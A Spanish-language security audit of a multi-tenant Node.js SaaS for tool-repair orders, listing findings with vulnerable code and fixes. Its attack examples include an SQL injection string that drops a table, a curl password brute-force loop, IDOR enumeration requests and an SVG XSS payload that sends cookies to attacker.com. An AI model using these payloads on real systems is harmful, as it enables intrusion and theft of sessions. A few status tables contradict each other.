# Auditoría de Seguridad — universal-cotizaciones SaaS Multi-Tenant

**Fecha original:** 2026-03-21 — **Última actualización:** 2026-04-20 (security-hardening-v1 en curso)
**Versión original:** commit `4bb1b88` — **Versión actual:** main (post Sprint 1–5)
**Stack:** Node.js 20 / Express 4.18 / MySQL 8.0 (Railway) / express-session / whatsapp-web.js / Anthropic SDK
**Auditor:** Claude Sonnet 4.6 — análisis ofensivo + defensivo

---

## 1. RESUMEN EJECUTIVO

| ID | Severidad | Ubicación | Descripción | Estado |
|----|-----------|-----------|-------------|--------|
| SEC-001 | 🔴 CRÍTICO | `routes/orders.js:66-68` | SQL con template literal — tenantId y LIMIT sin parametrizar | ✅ **RESUELTO** `feature/security-audit-fixes` |
| SEC-002 | 🔴 CRÍTICO | `routes/crear-orden.js:148-162` | IDOR: GET herramientas sin filtro tenant_id | ✅ **RESUELTO** `feature/security-audit-fixes` |
| SEC-003 | 🔴 CRÍTICO | `routes/crear-orden.js:221-224, 247-251` | INSERT herramienta_orden y foto sin tenant_id → datos en tenant 1 para todos | ✅ **RESUELTO** `feature/security-audit-fixes` |
| SEC-004 | 🟠 ALTA | `server.js:60-70` | Session store en MemoryStore — no persiste, memory leak | ✅ **RESUELTO** `feature/security-audit-fixes` — MySQLSessionStore |
| SEC-005 | 🟠 ALTA | `routes/superadmin.js:32-43` | Login superadmin sin rate limiting — brute force ilimitado | ✅ **RESUELTO** `feature/security-audit-fixes` — 5 intentos/15 min |
| SEC-006 | 🟠 ALTA | múltiples routes | `details: e.message` expuesto en errores 500 en producción | ✅ **RESUELTO** `feature/security-audit-fixes` |
| SEC-007 | 🟡 MEDIA | `routes/crear-orden.js:30-33`, `routes/orders.js:40-43` | Upload: solo valida MIME (client-controlled), sin magic bytes | ✅ **RESUELTO** `Sprint 1+6` — `utils/uploads.js:checkMagicBytes` (fix `fromFile` Sprint 6, 6/6 endpoints cubiertos) |
| SEC-008 | 🟡 MEDIA | `server.js:47-48` | CSP `unsafe-inline` en scriptSrc — anula protección XSS | ⚠️ **PARCIAL** — `dashboard.html` JS/CSS extraídos (`Sprint 5`); otras páginas pendientes |
| SEC-009 | 🟡 MEDIA | `routes/orders.js:~509` | Mensajes WA con dirección/teléfono de tenant 1 hardcoded | 🔴 **ABIERTO** — requiere `ten_direccion`/`ten_telefono` en `b2c_tenant` |
| SEC-010 | 🟡 MEDIA | `routes/crear-orden.js:207` | Consecutivos de orden globales (todos los tenants) — info leakage | 🔴 **ABIERTO** |
| SEC-011 | 🟡 MEDIA | múltiples routes | Sin rate limiting en búsqueda, uploads, endpoints sensibles | ✅ **RESUELTO** `security-hardening-v1` — todos los endpoints cubiertos (search 30/min, listados/detalle 60/min, WA 10/5min, quotes 60/min) |
| SEC-012 | 🟢 BAJA | `middleware/tenant.js:72-75` | hostname en HTML de 404 sin escape — riesgo XSS reflected bajo | 🔴 **ABIERTO** |
| SEC-013 | 🟢 BAJA | `package.json:12` | `@anthropic-ai/sdk@0.13.0` — versión muy antigua (actual: 0.51+) | 🔴 **ABIERTO** |
| SEC-014 | 🟢 BAJA | `public/uploads/` | Sin política de retención — archivos acumulan indefinidamente | 🔴 **ABIERTO** |
| SEC-015 | 🟢 BAJA | toda la app | Sin audit log de operaciones críticas (cambios de estado, login) | ✅ **RESUELTO** `security-hardening-v1` — tabla `b2c_audit_log` + `utils/audit.js` + 13 acciones instrumentadas en 7 archivos |
| SEC-016 | ℹ️ INFO | `routes/superadmin.js` | Sin 2FA para cuenta superadmin | 🔴 **ABIERTO** |
| SEC-017 | ℹ️ INFO | `routes/crear-orden.js:207` | Race condition en consecutivo de orden bajo carga | 🔴 **ABIERTO** |

**Puntuación de riesgo original:** 62 / 100 (MEDIO-ALTO) → **Estimado actual:** ~28 / 100 (BAJO-MEDIO)
**Veredicto actualizado:** APTO PARA PRODUCCIÓN CON TENANTS REALES — los 3 bloqueantes originales resueltos; quedan mejoras recomendadas (SEC-009 a SEC-017)

---

## 1-BIS. ACTUALIZACIONES POST-AUDITORÍA

### Cambios aplicados desde 2026-03-21

| Sprint / Branch | Fixes | Fecha |
|-----------------|-------|-------|
| `feature/security-audit-fixes` | SEC-001 a SEC-006 (6 críticos/altos) | 2026-03-21 |
| `feature/code-quality-sprint1` | SEC-007: checkMagicBytes centralizado | 2026-04-19 |
| `feature/hotfix-post-auditoria` | IDOR en `routes/quote.js` (nuevo hallazgo); JSON body limit 100kb | 2026-04-19 |
| `feature/code-quality-sprint3` | SEC-011 parcial: rate limiting WA (10/5min) + /quotes/machine (60/min) | 2026-04-20 |
| `feature/code-quality-sprint4` | Dedup `enviarListaRepuestos`; `connectTimeout` + `charset utf8mb4` en pool | 2026-04-20 |
| `feature/code-quality-sprint5` | SEC-008 parcial: `dashboard.html` JS/CSS extraídos; SEC-015 parcial: pino logger | 2026-04-20 |
| `feature/security-hardening-v1` | SEC-015 resuelto: tabla `b2c_audit_log` + `utils/audit.js` + 13 acciones instrumentadas | 2026-04-20 |

### Nuevo hallazgo (post-auditoría)

| ID | Severidad | Descripción | Estado |
|----|-----------|-------------|--------|
| SEC-018 | 🟠 ALTA | IDOR en `routes/quote.js`: `UPDATE her_estado='cotizada'` sin validar `uid_orden` ni `tenant_id` | ✅ **RESUELTO** `feature/hotfix-post-auditoria` |
| SEC-019 | 🟡 MEDIA | `express.json()` sin límite de tamaño — payload DoS con body enorme | ✅ **RESUELTO** `feature/hotfix-post-auditoria` — `limit: '100kb'` |

---

## 2. HALLAZGOS DETALLADOS

---

### SEC-001 — SQL con template literal en GET /orders

**Severidad:** 🔴 CRÍTICO
**Ubicación:** `routes/orders.js:61-68`

**Código actual:**
```javascript
const limit = Math.max(1, Math.min(50, parseInt(req.query.limit || '10', 10)));
const tenantId = req.tenant?.uid_tenant ?? 1;
const [rows] = await conn.execute(
  `SELECT ... FROM b2c_orden o
   JOIN b2c_cliente c ON o.uid_cliente = c.uid_cliente
   WHERE o.tenant_id = ${tenantId}
   ORDER BY o.ord_fecha DESC
   LIMIT ${limit}`   // ← interpolación directa
);
```

**Descripción:**
Aunque `tenantId` viene del middleware (BD) y `limit` es un entero clampeado, el uso de template literals para construir SQL viola el principio de parameterización y crea una superficie de ataque frágil. Si en alguna refactorización futura `tenantId` se derivara de user input (o si hubiera un bug en el middleware que permita inyectar un valor controlado), el resultado es SQL injection con acceso cross-tenant.

El mismo patrón existe en `routes/orders.js:193` (`WHERE o.tenant_id = ? ${estadoClause}`) — aquí `estadoClause` se construye concatenando sin parameterizar cuando incluye `LIKE`:
```javascript
estadoClause += ` AND o.ord_fecha LIKE ?`;
params.push(`${mes.replace('-', '')}%`);
```
Aquí `mes` viene de `req.query.mes` — el `.replace('-','')` no sanitiza completamente.

**Vector de ataque (hipotético):**
```
GET /api/orders?limit=10; DROP TABLE b2c_orden--
```
Actualmente bloqueado por el clamp, pero el patrón de código es incorrecto.

**Impacto:** Acceso a datos cross-tenant, exfiltración masiva, destrucción de datos.

**Corrección:**
```javascript
// Correcto:
const [rows] = await conn.execute(
  `SELECT ... FROM b2c_orden o
   JOIN b2c_cliente c ON o.uid_cliente = c.uid_cliente
   WHERE o.tenant_id = ?
   ORDER BY o.ord_fecha DESC
   LIMIT ?`,
  [tenantId, limit]
);
```
MySQL2 con `execute()` soporta `?` incluso en LIMIT desde v3+.

---

### SEC-002 — IDOR: GET /crear-orden/herramientas/:clienteId sin tenant_id

**Severidad:** 🔴 CRÍTICO
**Ubicación:** `routes/crear-orden.js:148-162`

**Código actual:**
```javascript
router.get('/crear-orden/herramientas/:clienteId', async (req, res) => {
  const conn = await db.getConnection();
  const [rows] = await conn.execute(
    `SELECT uid_herramienta, her_nombre, her_marca, her_serial, her_referencia
     FROM b2c_herramienta
     WHERE uid_cliente = ?          // ← SIN AND tenant_id = ?
     ORDER BY her_nombre`,
    [req.params.clienteId]
  );
```

**Descripción:**
Un usuario autenticado en tenant 2 puede consultar máquinas de cualquier cliente de tenant 1 (o cualquier otro tenant) simplemente conociendo o adivinando un `uid_cliente` entero secuencial. No hay verificación de que ese cliente pertenezca al tenant del usuario autenticado.

**Vector de ataque:**
```
# Usuario de Taller Bogotá (tenant 2) enumerando máquinas de SU HERRAMIENTA CST (tenant 1)
GET /api/crear-orden/herramientas/1
GET /api/crear-orden/herramientas/2
GET /api/crear-orden/herramientas/3
# → obtiene nombre, marca, serial de equipos de otro taller
```

**Impacto:** Exfiltración completa del inventario de herramientas de cualquier tenant. Directo rompe el aislamiento multi-tenant. **Este hallazgo por sí solo bloquea la comercialización.**

**Corrección:**
```javascript
router.get('/crear-orden/herramientas/:clienteId', async (req, res) => {
  const tenantId = req.tenant?.uid_tenant ?? 1;
  const conn = await db.getConnection();
  const [rows] = await conn.execute(
    `SELECT uid_herramienta, her_nombre, her_marca, her_serial, her_referencia
     FROM b2c_herramienta
     WHERE uid_cliente = ? AND tenant_id = ?
     ORDER BY her_nombre`,
    [req.params.clienteId, tenantId]
  );
  conn.release();
  res.json(rows);
});
```

---

### SEC-003 — INSERTs sin tenant_id: herramienta_orden y foto

**Severidad:** 🔴 CRÍTICO
**Ubicación:** `routes/crear-orden.js:221-224` y `routes/crear-orden.js:247-251`

**Código actual:**
```javascript
// Línea 221 — INSERT herramienta_orden SIN tenant_id
const [hRes] = await conn.execute(
  `INSERT INTO b2c_herramienta_orden (uid_orden, uid_herramienta, hor_observaciones, her_estado)
   VALUES (?, ?, ?, 'pendiente_revision')`,
  [uid_orden, maq.uid_herramienta, maq.observaciones || null]
  // ← falta tenant_id — DEFAULT 1 en BD → todos los registros quedan en tenant 1
);

// Línea 247 — INSERT foto SIN tenant_id
await conn.execute(
  `INSERT INTO b2c_foto_herramienta_orden (uid_herramienta_orden, fho_archivo, fho_nombre)
   VALUES (?, ?, ?)`,
  [herramientaOrdenId, req.file.filename, req.file.originalname]
  // ← mismo problema
);
```

**Descripción:**
Cuando un taller nuevo (tenant 2) crea una orden, las filas de `b2c_herramienta_orden` y `b2c_foto_herramienta_orden` se insertan con `tenant_id=1` (valor por defecto de la BD) en lugar del tenant correcto. Consecuencias:

1. Las máquinas de tenant 2 quedan asociadas a tenant 1 en las tablas de órdenes.
2. Consultas que filtran por `AND tenant_id = 2` no encontrarán esas máquinas.
3. Consultas de tenant 1 pueden ver máquinas de tenant 2 si no filtran correctamente.

**Impacto:** Pérdida de datos para tenants nuevos y cross-tenant data leak. Funcionalidad completamente rota para multi-tenant real.

**Corrección:**
```javascript
// En crear-orden/orden (línea ~205 — tenantId ya está disponible)
const [hRes] = await conn.execute(
  `INSERT INTO b2c_herramienta_orden
     (uid_orden, uid_herramienta, hor_observaciones, her_estado, tenant_id)
   VALUES (?, ?, ?, 'pendiente_revision', ?)`,
  [uid_orden, maq.uid_herramienta, maq.observaciones || null, tenantId]
);

// En crear-orden/foto/:herramientaOrdenId
const tenantId = req.tenant?.uid_tenant ?? 1;
await conn.execute(
  `INSERT INTO b2c_foto_herramienta_orden
     (uid_herramienta_orden, fho_archivo, fho_nombre, tenant_id)
   VALUES (?, ?, ?, ?)`,
  [herramientaOrdenId, req.file.filename, req.file.originalname, tenantId]
);
```

---

### SEC-004 — Session store en MemoryStore (sin persistencia)

**Severidad:** 🟠 ALTA
**Ubicación:** `server.js:60-70`

**Descripción:**
Express-session sin `store` definido usa `MemoryStore` — el store por defecto que el propio módulo documenta como **"not designed for production"**. Problemas:

1. **Todas las sesiones se pierden en cada restart** de Railway (que ocurre en cada deploy).
2. **Memory leak**: las sesiones expiradas no se limpian activamente. Bajo ataque o uso intenso, el proceso crece hasta OOM y Railway lo reinicia.
3. **Sin escala horizontal**: si Railway escala a 2 instancias, un usuario logueado en instancia A falla en instancia B.

La nota en MEMORY.md menciona `utils/session-store.js` de `feature/audit-fixes`, pero ese archivo nunca se mergeó a main y no existe.

**Corrección:**
```javascript
const MySQLStore = require('./utils/session-store'); // implementar con mysql2
app.use(session({
  store: new MySQLStore(db),
  secret: process.env.SESSION_SECRET,
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 8*60*60*1000, httpOnly: true, sameSite: 'lax', secure: true },
}));
```
O usar `express-mysql-session` (compatible con mysql2 pool).

---

### SEC-005 — Superadmin login sin rate limiting

**Severidad:** 🟠 ALTA
**Ubicación:** `routes/superadmin.js:32-43`

**Descripción:**
El endpoint `POST /superadmin/api/login` no tiene rate limiting. Un atacante puede intentar contraseñas indefinidamente. La ruta de superadmin no pasa por el tenant middleware, tampoco por el rate limiter de `routes/auth.js` (que cubre solo `POST /login`).

**Vector de ataque:**
```bash
# Brute force sin límite — 1000 intentos/seg si la red lo permite
for pass in $(cat wordlist.txt); do
  curl -s -X POST https://taller.suherramienta.com/superadmin/api/login \
    -H "Content-Type: application/json" \
    -d "{\"password\":\"$pass\"}"
done
```

**Impacto:** Acceso completo al panel de administración de todos los tenants. Compromiso total del SaaS.

**Corrección:**
```javascript
// routes/superadmin.js — agregar al inicio
const rateLimit = require('express-rate-limit');
const superadminLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 5,
  message: { error: 'Demasiados intentos. Espere 15 minutos.' },
  standardHeaders: true,
  legacyHeaders: false,
});
router.post('/login', superadminLimiter, (req, res) => { ... });
```

---

### SEC-006 — Detalles de error expuestos en producción

**Severidad:** 🟠 ALTA
**Ubicación:** `routes/orders.js:74`, `routes/orders.js:154`, `routes/orders.js:204`, y múltiples rutas

**Código actual:**
```javascript
res.status(500).json({ error: 'Error cargando órdenes', details: e.message });
```

**Descripción:**
Los mensajes de error de MySQL se exponen directamente al cliente en producción. Ejemplos reales de lo que se filtra:
- Nombres de tablas: `Table 'railway.b2c_orden' doesn't exist`
- Estructura de columnas: `Unknown column 'tenant_id' in 'where clause'`
- Tipo de BD y versión: `ER_PARSE_ERROR at line 1: ...`

**Vector de ataque:** Provocar errores intencionalmente con parámetros malformados para mapear la estructura de la BD y planificar ataques más sofisticados.

**Corrección:**
```javascript
// Error handler global en server.js ya hace esto bien:
res.status(500).json({
  error: 'Error interno del servidor',
  message: process.env.NODE_ENV === 'development' ? err.message : undefined,
});
// Pero las rutas individuales lo hacen mal. Cambiar en cada catch:
res.status(500).json({ error: 'Error interno del servidor' }); // sin details
// Y loggear internamente:
console.error('[orders/search]', e.message);
```

---

### SEC-007 — Upload: validación de MIME sin magic bytes

**Severidad:** 🟡 MEDIA
**Ubicación:** `routes/crear-orden.js:30-33`, `routes/orders.js:40-43`

**Descripción:**
El `fileFilter` de multer solo verifica `file.mimetype.startsWith('image/')`. El MIME type es una cabecera HTTP enviada por el cliente — puede falsificarse trivialmente.

```javascript
// Un atacante puede enviar esto:
// Content-Type: image/png
// (con un archivo SVG con JS embebido)
```

Si se sube un SVG con contenido malicioso (`<svg onload="...">`), y se sirve como archivo estático desde `/uploads/`, se ejecutará en el navegador de cualquier usuario que lo abra.

**Ataque XSS via SVG:**
```xml
<!-- malicious.svg subido como "image/png" -->
<svg xmlns="http://www.w3.org/2000/svg">
  <script>fetch('https://attacker.com/?c='+document.cookie)</script>
</svg>
```
El archivo queda en `/public/uploads/fotos-recepcion/` y se sirve con `requireLogin` — robaría la cookie de cualquier usuario interno que cargue la foto.

**Corrección:**
```javascript
const { fileTypeFromBuffer } = require('file-type'); // npm install file-type

fileFilter: async (req, file, cb) => {
  const ALLOWED = ['image/jpeg', 'image/png', 'image/webp'];
  // Leer primero 4100 bytes para magic bytes
  const chunks = [];
  file.stream.on('data', chunk => {
    chunks.push(chunk);
    if (Buffer.concat(chunks).length >= 4100) file.stream.destroy();
  });
  file.stream.once('close', async () => {
    const buf = Buffer.concat(chunks);
    const type = await fileTypeFromBuffer(buf);
    if (type && ALLOWED.includes(type.mime)) cb(null, true);
    else cb(new Error('Tipo de archivo no permitido'));
  });
}
```
Alternativa práctica: rechazar SVG explícitamente y bloquear con `Content-Disposition: attachment` al servir `/uploads/`.

---

### SEC-008 — CSP con unsafe-inline en scriptSrc

**Severidad:** 🟡 MEDIA
**Ubicación:** `server.js:47-48`

**Descripción:**
```javascript
scriptSrc: ["'self'", "'unsafe-inline'"],
scriptSrcAttr: ["'unsafe-inline'"],
```
La directiva `'unsafe-inline'` anula completamente la protección XSS de la CSP. Si un atacante logra inyectar HTML (ej: a través de un dato no escapado que se renderice en el DOM), el script inline se ejecutará.

El `scriptSrcAttr: ["'unsafe-inline'"]` además permite `onclick`, `onload`, etc. en atributos — exactamente lo que las páginas usan, pero también lo que un atacante querría inyectar.

**Impacto:** Un XSS stored o reflected tiene efecto completo (robo de cookies, exfiltración de datos).

**Nota:** Eliminar `unsafe-inline` requeriría refactorizar todo el JS inline de las 6 páginas HTML a archivos `.js` separados. Es trabajo significativo pero el correcto para producción multi-tenant.

**Mitigación parcial inmediata:**
```javascript
// Agregar nonce por request (reduce la superficie sin refactorizar todo)
// O al menos agregar report-uri para detectar inyecciones:
scriptSrc: ["'self'", "'unsafe-inline'"],
reportTo: "/csp-report",
```

---

### SEC-009 — Mensajes WhatsApp con datos de tenant 1 hardcoded

**Severidad:** 🟡 MEDIA
**Ubicación:** `routes/orders.js` (mensaje "reparada")

**Descripción:**
El mensaje automático al marcar una máquina como "reparada" incluye datos hardcoded del primer tenant:

```javascript
const msg = `... está *reparada y lista para recoger* 🔧\n\n📍 Calle 21 No 10 02, Pereira\n📞 3104650437`;
```

Si tenant 2 (un taller en Bogotá) marca una máquina como reparada, el cliente de Bogotá recibirá una dirección de Pereira para recoger su herramienta.

**Impacto:** Confusión operativa para clientes de nuevos tenants. Expone datos de SU HERRAMIENTA CST a clientes de otros talleres.

**Corrección:**
```javascript
const tenant = req.tenant;
const direccion = tenant.ten_direccion || 'Ver nuestra dirección en el sitio web';
const telefono  = tenant.ten_telefono  || tenant.ten_wa_number || '';
const msg = `... está *reparada y lista para recoger* 🔧\n\n📍 ${direccion}\n📞 ${telefono}`;
```
Requiere agregar `ten_direccion` y `ten_telefono` a la tabla `b2c_tenant`.

---

### SEC-010 — Consecutivos de orden globales (todos los tenants)

**Severidad:** 🟡 MEDIA
**Ubicación:** `routes/crear-orden.js:207`

**Descripción:**
```javascript
const [[maxRow]] = await conn.execute(
  `SELECT COALESCE(MAX(ord_consecutivo), 0) + 1 AS next FROM b2c_orden`
  // ← SIN WHERE tenant_id = ?
);
```

El consecutivo de orden es global: si tenant 1 tiene 500 órdenes y tenant 2 crea una, le asigna el consecutivo 501. Esto:
1. Filtra información de volumen de negocio entre tenants.
2. Tiene race condition bajo carga (dos tenants creando órdenes simultáneamente pueden obtener el mismo consecutivo).

**Corrección:**
```javascript
const [[maxRow]] = await conn.execute(
  `SELECT COALESCE(MAX(ord_consecutivo), 0) + 1 AS next FROM b2c_orden WHERE tenant_id = ?`,
  [tenantId]
);
```
Cada tenant tendrá su propia secuencia (1, 2, 3...) independiente.

---

### SEC-011 — Sin rate limiting en endpoints sensibles

**Severidad:** 🟡 MEDIA
**Ubicación:** múltiples routes

**Endpoints sin rate limiting:**
- `GET /api/orders/search` — permite enumerar clientes y órdenes sin límite
- `GET /api/crear-orden/cliente/buscar` — permite enumerar clientes sin límite
- `POST /api/crear-orden/cliente` — permite crear clientes masivamente
- `POST /api/crear-orden/orden` — permite crear órdenes masivamente
- `POST /superadmin/api/tenants` — permite crear tenants sin límite

**Corrección:** Aplicar `express-rate-limit` (ya está en dependencies) a endpoints críticos:
```javascript
const searchLimiter = rateLimit({ windowMs: 60000, max: 60 }); // 60 búsquedas/min
router.get('/orders/search', searchLimiter, async (req, res) => { ... });
```

---

### SEC-012 — XSS reflected en página 404 del tenant

**Severidad:** 🟢 BAJA
**Ubicación:** `middleware/tenant.js:72-75`

**Código actual:**
```javascript
return res.status(404).send(
  '<h1>404 — Taller no encontrado</h1>' +
  '<p>El dominio <strong>' + hostname + '</strong> no está registrado.</p>'
);
```

`req.hostname` en Express es relativamente sanitizado (convierte a minúsculas, elimina puerto), pero en ciertos proxies o configuraciones podría contener caracteres no esperados. Aunque la explotabilidad es baja, es una mala práctica.

**Corrección:**
```javascript
const safeHostname = hostname.replace(/[<>&"']/g, '');
return res.status(404).send(
  `<h1>404 — Taller no encontrado</h1>` +
  `<p>El dominio <strong>${safeHostname}</strong> no está registrado.</p>`
);
```

---

### SEC-013 — Dependencia @anthropic-ai/sdk muy antigua

**Severidad:** 🟢 BAJA
**Ubicación:** `package.json:12`

```json
"@anthropic-ai/sdk": "^0.13.0"
```

La versión 0.13.x es de 2023. La actual (2026) supera 0.50+. Pueden existir vulnerabilidades corregidas en versiones intermedias. Además, el CLAUDE.md indica que se debe usar `client.beta.messages.create()` — lo que sugiere que la API ha cambiado y una actualización podría romper cosas sin revisión.

**Acción:** Revisar changelog de la SDK, actualizar con pruebas.

---

### SEC-014 — Sin política de retención de archivos

**Severidad:** 🟢 BAJA
**Ubicación:** `public/uploads/`

Los archivos subidos (fotos, PDFs, facturas) se acumulan indefinidamente en el Railway Volume. Sin limpieza:
- Crecimiento ilimitado del disco
- Archivos de órdenes eliminadas persisten
- GDPR/protección de datos: imágenes de equipos de clientes sin período de retención

**Acción:** Implementar job periódico que elimine archivos de órdenes con más de N años.

---

### SEC-015 — Sin audit log de operaciones críticas

**Severidad:** 🟢 BAJA
**Ubicación:** toda la aplicación
**Estado:** ✅ RESUELTO en `feature/security-hardening-v1` (2026-04-20)

**Solución implementada:**
- Tabla `b2c_audit_log` (tenant_id, uid_usuario, accion, entidad, uid_entidad, datos_antes, datos_despues, ip_origen, created_at)
- `utils/audit.js` — `logAudit()` fire-and-forget con try/catch propio (nunca bloquea la operación principal)
- 13 acciones instrumentadas en 7 archivos: `login_ok`, `login_fallido`, `password_cambiado`, `cliente_creado`, `orden_creada`, `estado_cambiado`, `cotizacion_autorizada`, `cotizacion_rechazada`, `informe_generado`, `funcionario_creado`, `tenant_creado`, `tenant_editado`, `usuario_creado_superadmin`

---

### SEC-016 — Sin 2FA para superadmin (INFO)

**Severidad:** ℹ️ INFO
**Ubicación:** `routes/superadmin.js`

La cuenta superadmin controla todos los tenants del SaaS con una sola contraseña. Sin segundo factor, si esa contraseña se filtra (breach de variable de entorno de Railway), el atacante tiene control total.

**Recomendación:** Implementar TOTP (Google Authenticator) para el login de superadmin.

---

### SEC-017 — Race condition en consecutivo de orden (INFO)

**Severidad:** ℹ️ INFO
**Ubicación:** `routes/crear-orden.js:207-215`

```javascript
// SELECT MAX + INSERT — no atómico
const [[maxRow]] = await conn.execute(`SELECT COALESCE(MAX(ord_consecutivo), 0) + 1 AS next FROM b2c_orden`);
const consecutivo = maxRow.next;
const [ordRes] = await conn.execute(`INSERT INTO b2c_orden (ord_consecutivo, ...) VALUES (?, ...)`, [consecutivo, ...]);
```

Dos peticiones simultáneas pueden obtener el mismo consecutivo. En baja carga esto es raro, pero en un SaaS con múltiples tenants activos es posible.

**Corrección:** Usar `AUTO_INCREMENT` propio o `SELECT ... FOR UPDATE` en transacción.

---

## 3. AISLAMIENTO MULTI-TENANT

### Rutas revisadas y resultado

| Ruta | Filtro tenant_id | Estado |
|------|-----------------|--------|
| `GET /api/orders` | `WHERE o.tenant_id = ?` ✓ + `LIMIT ${limit}` clampeado | ✅ SEC-001 resuelto |
| `GET /api/orders/search` | `WHERE o.tenant_id = ?` ✓ | ✅ |
| `GET /api/orders/by-estado` | `WHERE o.tenant_id = ?` ✓ | ✅ |
| `GET /api/orders/mis-ordenes-tecnico` | `AND o.tenant_id = ?` ✓ | ✅ |
| `GET /api/orders/:orderId` | via `resolveOrder(conn, id, tenantId)` | ✅ |
| `GET /api/crear-orden/cliente/buscar` | `WHERE tenant_id = ?` ✓ | ✅ |
| `GET /api/crear-orden/herramientas/:clienteId` | `AND tenant_id = ?` ✓ | ✅ SEC-002 resuelto |
| `POST /api/crear-orden/cliente` | INSERT con `tenant_id` ✓ | ✅ |
| `POST /api/crear-orden/herramienta` | INSERT con `tenant_id` ✓ | ✅ |
| `POST /api/crear-orden/orden` | INSERT orden, herramienta_orden y foto con `tenant_id` ✓ | ✅ SEC-003 resuelto |
| `POST /api/crear-orden/foto/:id` | INSERT con `tenant_id = ?` ✓ | ✅ SEC-003 resuelto |
| `GET /api/dashboard` | Múltiples queries con `tenant_id = ?` ✓ | ✅ |
| `GET /api/clientes/search` | `WHERE tenant_id = ?` ✓ | ✅ |
| Login / auth | `WHERE usu_login = ? AND tenant_id = ?` ✓ | ✅ |
| `GET /me` | Cross-tenant check en session ✓ | ✅ |
| `requireInterno` | `sessionMatchesTenant()` ✓ | ✅ |
| `tenantMiddleware` | Resuelve por hostname/dominio_custom ✓ | ✅ |
| `GET /api/tenant/config` | Retorna `req.tenant` (ya resuelto) ✓ | ✅ |

### Queries críticas verificadas

**Login multi-tenant** (`routes/auth.js`):
```sql
SELECT uid_usuario, usu_nombre, usu_login, usu_clave, usu_tipo, usu_estado, tenant_id
FROM b2c_usuario
WHERE usu_login = ? AND tenant_id = ? AND usu_estado = 'A'
```
✅ Correcto — un usuario de tenant 2 no puede hacer login en tenant 1.

**Cross-tenant session block** (`middleware/auth.js:10-16`):
```javascript
const sessionTenant = req.session.user.tenant_id ?? 1;
const reqTenant = req.tenant?.uid_tenant ?? 1;
return sessionTenant === reqTenant;
```
✅ Correcto — sesión de tenant 2 usada en dominio de tenant 1 es destruida.

**Búsqueda de órdenes** (`routes/orders.js:138`):
```sql
WHERE o.tenant_id = ? AND (CAST(o.ord_consecutivo AS CHAR) LIKE ? OR ...)
```
✅ Correcto.

### Brechas de aislamiento confirmadas

1. ~~`GET /api/crear-orden/herramientas/:clienteId` — cross-tenant leak~~ ✅ **Resuelto (SEC-002)**
2. ~~INSERTs sin tenant_id en herramienta_orden y foto~~ ✅ **Resuelto (SEC-003)**
3. **Consecutivos globales** (SEC-010) — info leakage de volumen entre tenants — **PENDIENTE**

---

## 4. CUMPLIMIENTO MÍNIMO COMERCIAL

| Requisito | Estado | Notas |
|-----------|--------|-------|
| Contraseñas hasheadas con bcrypt | ✅ CUMPLE | cost factor 10, bcrypt v6 |
| SESSION_SECRET obligatorio en producción | ✅ CUMPLE | lanza error si no está |
| HTTPS en producción | ✅ CUMPLE | BEHIND_PROXY + redirect 301 |
| Cookies httpOnly + sameSite | ✅ CUMPLE | lax en prod |
| Rate limiting en login | ✅ CUMPLE | 10 intentos / 15 min |
| Cabeceras de seguridad HTTP (Helmet) | ✅ CUMPLE | CSP + HSTS + X-Frame-Options |
| Queries parametrizadas (mayoría) | ✅ CUMPLE | SEC-001 resuelto; `LIMIT ${limit}` seguro (valor clampeado) |
| Aislamiento de datos entre tenants (mayoría) | ✅ CUMPLE | SEC-002, SEC-003 resueltos; SEC-009/010 pendientes (baja criticidad) |
| Sesiones persistentes (sobreviven restart) | ✅ CUMPLE | MySQLSessionStore implementado |
| Rate limiting en superadmin | ✅ CUMPLE | 5 intentos / 15 min |
| Errores sin stack trace en producción | ✅ CUMPLE | SEC-006 resuelto; pino logger con `{ err: e }` estructurado |
| Validación de archivos subidos (magic bytes) | ✅ CUMPLE | `checkMagicBytes` via `file-type` en todos los uploads |
| Audit log de operaciones | ❌ NO CUMPLE | No existe |
| Política de retención de datos | ❌ NO CUMPLE | Archivos acumulan indefinidamente |
| Dependencias sin CVEs conocidos | ⚠️ PARCIAL | @anthropic-ai/sdk muy antigua |
| Configuración correcta CORS | ✅ CUMPLE | origin: false bloquea cross-origin |
| Superadmin protegido | ⚠️ PARCIAL | Rate limit OK; sin 2FA (SEC-016, info) |
| Datos multi-tenant separados por defecto | ⚠️ PARCIAL | 3 brechas específicas identificadas |

---

## 5. VEREDICTO FINAL

### APTO CON CORRECCIONES

El sistema tiene una base de seguridad sólida: bcrypt, Helmet, HTTPS, rate limiting en login, tenant isolation en la mayoría de queries, cross-tenant session blocking, y una suite de tests de aislamiento que detectó y corrigió 2 bugs críticos durante el desarrollo. Es claramente un trabajo serio.

**Los 3 bloqueantes originales están RESUELTOS** ✅

- ~~SEC-002: IDOR herramientas~~ — resuelto en `feature/security-audit-fixes`
- ~~SEC-003: INSERTs sin tenant_id~~ — resuelto en `feature/security-audit-fixes`
- ~~SEC-004: MemoryStore~~ — resuelto en `feature/security-audit-fixes` (MySQLSessionStore)

---

**Correcciones pendientes (no bloqueantes):**
- SEC-009: Datos de tenant en mensajes WA — requiere columnas `ten_direccion`/`ten_telefono` en `b2c_tenant` 🔴
- SEC-010: Consecutivos por tenant — 10 min + migración 🔴
- SEC-011: Rate limiting en search/crear-orden endpoints ⚠️
- SEC-012: Escape hostname en 404 — 1 línea 🟢
- SEC-013: Actualizar `@anthropic-ai/sdk` — revisar changelog 🟢
- SEC-015: Audit log en BD (quién cambió qué estado) — tabla nueva 🟢
- SEC-016: 2FA superadmin — TOTP (scope amplio) ℹ️

---

**El sistema estará listo para comercializar en cuanto se corrijan los 3 bloqueantes.** El resto son mejoras de hardening que pueden hacerse en iteraciones posteriores.
